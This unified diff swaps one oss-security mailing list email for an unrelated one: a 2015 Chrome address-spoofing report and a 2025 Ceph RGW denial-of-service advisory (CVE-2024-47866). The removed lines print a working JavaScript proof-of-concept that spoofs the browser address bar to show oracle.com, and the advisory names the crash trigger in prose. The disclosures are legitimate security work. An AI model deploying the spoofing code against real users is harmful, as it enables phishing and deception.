@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1781" "Tuesday" "30" "June" "2015" "16:42:24" "+0000" "Big Whale" "d0lph1n98@yahoo.com" "<1787532957.2509181.1435682544580.JavaMail.yahoo@mail.yahoo.com>" "68" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" nil nil nil "6" "2015063016:42:24" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" (number mark "        d0lph1n98@ya Jun 30   68/1781  " thread-indent "\"[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)\"\n") "<55923253.8020902@deusen.co.uk>" ("<55923253.8020902@deusen.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 3287 invoked by uid 550); 1 Jul 2015 07:51:15 -0000
+Received: (qmail 32294 invoked by uid 550); 11 Nov 2025 18:41:27 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,97 +6,91 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 7552 invoked from network); 30 Jun 2015 16:42:49 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1435682556; bh=VDY8D2CKLy9w9EKKbBCVbFnc8bUOti6/nz6fKTUYAT0=; h=Date:From:Reply-To:To:In-Reply-To:References:Subject:From:Subject; b=g6YJcVdhoMUcNxrcblkq+ulghqYFlCksrNMblCMwgMgl6tdDIyKE1f07SMNzEknXmgF6NlKg68rQjXdVO4ZX+r/v35jBOnLls8A5uPHUp3UxR79IXsux83QhSo3Is+J5zaVt2Eg3YyPiSdp7AObxGsehqZfOwLX2go7oOxOwb+/yRMJbqAcLu2P+IKF0KeoUD2bl9tymhbv2uLCdbYphxMkCLE6QQzFL0+WoASiDtEH5QUpxdh/BkxTNXhXv6lZRafQl1A/+urSdUQYF+A5xD10Av/RqeSM1HDz+LHNlRTLBKW4Zyqd1MDPmfNxGv8jWLxnuSsbioW7DNxbeXn85KQ==
-X-Yahoo-Newman-Property: ymail-3
-X-Yahoo-Newman-Id: 541291.54158.bm@omp1053.mail.ne1.yahoo.com
-X-YMail-OSG: fcVWMm0VM1kq7w3TQFa9Kv4LZsRuH9iwNE49SuDJWeCCxqaBUll1nRs602BMOji
- BH2p9RULuC9vV0oMqu1VLuFWAyFg.IF.3uPQ9o7GB7CsOZ68vivaCUmD.pW6cG7EQNPiUZMzjWKD
- SbZX2YXmfrRhqB_kB0QtqlBo4VngRUsz_sngm0PLhBsahlIpoYER9N9HRJK0A71i3aXs5jVAcMdI
- 45ER0yhDHp6oP5c5MTg.0j3lHjpKdQER_eZGtECN2QJw.yAJQtJimuUgBOMUO3iBJ.rw0Gqibfei
- eoaROWSl8HVUszsAK5ebpF6Y8ydk3JdvX4P_Vhu3a0XiqdM8ZLGvw8hUj.T55zWIvvpqKWmz3WOz
- u5xticEPYB3INvkIt0_LEtj2n2zAjH8f.ysoqhidavulfg2iv2xCq9CBHA_wezMwswpSr9IzwNAm
- wq73MCBotfMKslaMCvQ3qbT9_WmZ7Byr2KkYABoerp4qVS8H4Co.tp.QIbeh21E5occ8-
-Message-ID: <1787532957.2509181.1435682544580.JavaMail.yahoo@mail.yahoo.com>
-In-Reply-To: <55923253.8020902@deusen.co.uk>
-References: <55923253.8020902@deusen.co.uk>
-MIME-Version: 1.0
-Content-Type: multipart/alternative; 
-	boundary="----=_Part_2509180_399487137.1435682544577"
-Date: Tue, 30 Jun 2015 16:42:24 +0000 (UTC)
-From: Big Whale <d0lph1n98@yahoo.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Google Chrome Address Spoofing (Request For Comment)
-To: David Leo <david.leo@deusen.co.uk>, 
-	"bugtraq@securityfocus.com" <bugtraq@securityfocus.com>, 
-	"fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, 
-	"oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+x-ms-reactions: disallow
+Received: (qmail 9814 invoked from network); 11 Nov 2025 14:49:46 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1762872576;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type;
+	bh=mzLSUtnDIEb7JwMZcdVp2HEdWg+v+06kX1WnGXuFPjQ=;
+	b=UyqC3VrkEEMPB7BeLoFVLpkCpJhBOYo04dm6S6hKyxrwTQzH1ZkpTRgXY4SAT70bMUSAqj
+	k59Swk39t9F9nEn1Zp/+KMv8RpPVMlU7Fxyh/Ler+G12YabXGPDMKEtiCAm76W46MhPxR7
+	//qZrHkiKgQesENGwJxNoUOhraf1rcA=
+X-MC-Unique: o1gyDCrUM_GK4pbfghzoWQ-1
+X-Mimecast-MFC-AGG-ID: o1gyDCrUM_GK4pbfghzoWQ_1762872573
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1762872571; x=1763477371;
+        h=to:subject:message-id:date:from:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=mzLSUtnDIEb7JwMZcdVp2HEdWg+v+06kX1WnGXuFPjQ=;
+        b=gLX3Y8UCS7cYWpTAr1FD3OfCX3FhCsXfd7APXo6e5M4hNIcrg8SloVmyEYVtzCLMpl
+         ljcRWZmKr0HDRKw+oIuEQo0He0TVB60d+OIAWJ73HJf8SaODP/2XkzOcEgc3MCXj1nwA
+         ISiHUGn/nIOuunt2iQk1Fzlr4Xc4xCUU0iNElEPJQ+dWHRdk7yKoijOpSsT/Mxzi7r1F
+         vPtf98qE4y/btlObt66iSd6VAtgAp27Xjcypj7PCTkca6WAzHUWgC1hmLt7PoMGvju1/
+         1KQSqb68jP/uIJv+Zl+CbE/1EyAkcBC1qP8G4CYE+3G5r2hBaPIaxeYBnBrdlDuvC6YD
+         CJGw==
+X-Forwarded-Encrypted: i=1; AJvYcCWn6p5dYvqsqs+XITuhoXsMWp1JgBMTEAN8g9gI211X2p7HH7Zkf4wM+6OPMVodHs1fiRE/wsD3ZIkW3mU=@lists.openwall.com
+X-Gm-Message-State: AOJu0YwV7VzZddqFdt0tgUrK7R3o6Q439uv8j7qEI8oaEj7pgU5rCoyn
+	/TXUQZm4j1KTiVCc9ejaDSQVK73EzRHSWCHwE3NATyGScgt2kpldVZQcFIT1YDG0Ke28SvqGL6L
+	IUf+KGDbgziurk+e49KnxmnY7H4d73mgNcJ2SwzemgFcZuOFv26T2nzwKkEZC/DEzyziVSZwWNs
+	otPOxsTVjd1BoblcWE+0vL1meUOxOo/9KO3MLXgKfTwCgxO6FXur5piXw=
+X-Gm-Gg: ASbGnctZXLusKzh29ifbtMg/Jx+XgS6YMrec4hmh4ELRZTZwtWvpyHKoOT0i0CLSOD3
+	cwYva35BSofjaHahX7EnxGeOI0b3eaGornTMtiPPnE5HpuvbRJiWoAS3rfU/4Ozs5EFhuKUbtJw
+	zWPYqO/N4kJqsk/aTXXM2C8fK3ooSdGmFfWjAZ7yLwP+atOTWEIRtmn9E=
+X-Received: by 2002:a05:6402:2793:b0:641:8d40:8672 with SMTP id 4fb4d7f45d1cf-6418d4088a6mr7392899a12.16.1762872571316;
+        Tue, 11 Nov 2025 06:49:31 -0800 (PST)
+X-Google-Smtp-Source: AGHT+IHc+i03sJ0W8PWKrrq1H0WeKIl57PDgX+2XnvsB4t6eq+chMudjS66IECC6vPBqVk0rcGzylYRn2l/gMH1mC+s=
+X-Received: by 2002:a05:6402:2793:b0:641:8d40:8672 with SMTP id
+ 4fb4d7f45d1cf-6418d4088a6mr7392873a12.16.1762872570812; Tue, 11 Nov 2025
+ 06:49:30 -0800 (PST)
+MIME-Version: 1.0
+From: "Sage [They / Them] McTaggart" <amctagga@redhat.com>
+Date: Tue, 11 Nov 2025 09:49:19 -0500
+X-Gm-Features: AWmQ_bntrPqGu-4CYYyv3c6S70ajMY8Qpl1Uvs9wzjqZvSQaMTjbpyEXCf6qkqY
+Message-ID: <CABBoSti2LtHdkMw=dkx_0bAgfg6pnwnzLjGW_ung6cORPNzh5g@mail.gmail.com>
+To: =?UTF-8?B?546L55uI?= <wangying2023@ict.ac.cn>, 
+	oss-security@lists.openwall.com
+X-Mimecast-Spam-Score: 0
+X-Mimecast-MFC-PROC-ID: h9PlphGoHAdvtK2R2bJOk_18YDdANbTUSy6XUlGSIPY_1762872573
+X-Mimecast-Originator: redhat.com
+Content-Type: multipart/alternative; boundary="0000000000005e3c42064352c12d"
+Subject: [oss-security] CVE-2024-47866 Ceph: RGW DoS via improper input validation.
 
-------=_Part_2509180_399487137.1435682544577
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
+--0000000000005e3c42064352c12d
+Content-Type: text/plain; charset="UTF-8"
 
-Tested on Google Chrome 43.0.2357.130 (64-bit) (Linux) and it works. I do n=
-ot think it is some kind of DoS attack, it is clearly URL spoofing vulnerab=
-ility. Perhaps, your report does not clarify the vulnerability precisely.=20
+Hello all,
+A flaw was found in Ceph's RGW module. An attacker can use improper input
+validation to create a Denial Of Service within RGW. By using the argument
+`x-amz-copy-source` to put an object and specifying an empty string as its
+content , it will lead to the RGW daemon crashing, resulting in a DoS
+attack.
 
+Our public advisory may be found at the following URL:
+https://github.com/ceph/ceph/security/advisories/GHSA-mgrm-g92q-f8h8
 
-     On Tuesday, June 30, 2015 8:24 PM, David Leo <david.leo@deusen.co.uk> =
-wrote:
-=20=20=20
+We have assigned it a CVE of CVE-2024-47866 with a CVSS Score of 7.5
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+It is fixed in an upstream PR[1] and will be backported promptly to other
+releases.
+In downstream Ceph, it will be patched in Ceph 8.1z4 [2] set to be released
+this week.
 
- Impact:
-The "click to verify" thing is completely broken...
-Anyone can be "BBB Accredited Business" etc.
-You can make whitehouse.gov display "We love Islamic State" :-)
+[1]https://github.com/ceph/ceph/pull/65159
+[2] https://www.ibm.com/docs/en/storage-ceph/8.1.0?topic=release-notes-81
 
-Note:
-No user interaction on the fake page.
+Credits to: Ying Wang for discovery.
 
-Code:
-***** index.html
-<script>
-function next()
-{
-=C2=A0=C2=A0=C2=A0 w.location.replace('http://www.oracle.com/index.html?'+n=
-);n++;
-=C2=A0=C2=A0=C2=A0 setTimeout("next();",15);
-=C2=A0=C2=A0=C2=A0 setTimeout("next();",25);
-}
-function f()
-{
-=C2=A0=C2=A0=C2=A0 w=3Dwindow.open("content.html","_blank","width=3D500 hei=
-ght=3D500");
-=C2=A0=C2=A0=C2=A0 i=3DsetInterval("try{x=3Dw.location.href;}catch(e){clear=
-Interval(i);n=3D0;next();}",5);
-}
-</script>
-<a href=3D"#" onclick=3D"f()">Go</a><br>
-***** content.html
-<b>This web page is NOT oracle.com</b>
-<script>location=3D"http://www.oracle.com/index.html";</script>
-***** It's online
-http://www.deusen.co.uk/items/gwhere.6128645971389012/
-(The page says "June/16/2015" - it works as we tested today)
+Sage McTaggart
+IBM Product Security
 
-Request For Comment:
-We reported this to Google.
-They reproduced, and say
-It's DoS which doesn't matter.
-We think it's very strange,
-since the browser does not crash(not DoS),
-and the threat is obvious.
-What's your opinion?
+amct@redhat.com
 
-Kind Regards,
-
-PS
-We love clever tricks.
-We love this:
-http://dieyu.org/
+sagemct@ibm.com
 
 
+Pronouns:They/Them/Theirs
 
-=20=20=
+--0000000000005e3c42064352c12d--
 
-------=_Part_2509180_399487137.1435682544577--
